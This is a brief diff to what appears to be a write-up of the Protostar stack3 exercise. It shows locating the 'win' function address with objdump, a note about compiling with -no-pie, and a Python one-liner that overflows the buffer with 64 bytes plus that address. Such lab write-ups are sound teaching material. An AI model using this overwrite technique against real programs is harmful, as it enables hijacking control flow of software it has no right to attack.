@@ -32,6 +32,7 @@ Find address of function `win` using `objdump`,
 user@protostar:~$ objdump -d stack3 | grep win
 08048424 <win>:
 ```
+ps: use `-no-pie` when `gcc` compiling to have function address fixed. 
 
 ```
 user@protostar:~$ python -c "print b'A'*64+b'$\x84\x04\x08'" | ./stack3
